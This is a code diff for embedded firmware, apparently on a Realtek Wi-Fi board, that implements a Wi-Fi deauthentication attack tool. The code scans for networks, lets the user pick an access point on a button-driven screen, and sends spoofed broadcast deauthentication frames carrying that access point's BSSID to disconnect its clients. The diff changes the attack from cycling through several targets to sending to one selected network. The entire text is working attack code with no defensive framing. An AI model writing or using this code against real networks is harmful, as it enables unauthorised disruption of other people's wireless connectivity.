@@ -46,9 +46,9 @@ uint8_t activeInput = 0;
 char *buttonsString = "De-Authenticate";
 
 std::vector<WiFiScanResult> scan_results;
-std::vector<int> deauth_wifis;
 uint8_t deauth_bssid[6];
-uint16_t deauth_reason = 2;
+uint16_t deauth_reason;
+int current_channel = 1;
 
 rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
@@ -106,19 +106,10 @@ void showDeautherScreen() {
 
 void startDeauther() {
   if (isDeauthenticating) {
-    uint32_t current_num = 0;
-    while (deauth_wifis.size() > 0 && isDeauthenticating) {
-      memcpy(deauth_bssid, scan_results[current_num].bssid, 6);
-      wext_set_channel(WLAN0_NAME, scan_results[current_num].channel);
-      current_num++;
-      if (current_num >= deauth_wifis.size()) current_num = 0;
-
-      for (int i = 0; i < FRAMES_PER_DEAUTH; i++) {
-        wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
-        delay(5);
-      }
-      delay(50);
-    }
+    wext_set_channel(WLAN0_NAME, scan_results[activeSSIDIndex].channel);
+    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
+    delay(50);
+    Serial.println("De-Authentication package sent");
   }
 }
 
@@ -134,11 +125,15 @@ void handleSELButtonInterrupt() {
 void handleBACKButtonInterrupt() {
   isDeauthenticating = false;
   isMainMenu = true;
-  selectedMenu = -1;
+  activeInput = 0;
+  isChangingSSID = false;
   isPageLoaded = false;
 }
 
 void deautherSetup() {
+  isDeauthenticating = false;
+  activeInput = 0;
+  isChangingSSID = false;
   WiFi.disablePowerSave();
   wifi_on(RTW_MODE_PROMISC);
   wifi_enter_promisc_mode();
@@ -194,13 +189,11 @@ void deautherLoop() {
         isChangingSSID = true;
       }
     } else {
-      //clear current deauther lít
-      deauth_wifis.clear();
-      deauth_wifis.push_back(activeSSIDIndex);
 
       if (!isDeauthenticating) {
         buttonsString = "Stop";
         isDeauthenticating = true;
+        memcpy(deauth_bssid, scan_results[activeSSIDIndex].bssid, 6);
       } else {
         isDeauthenticating = false;
         buttonsString = "De-Authenticate";
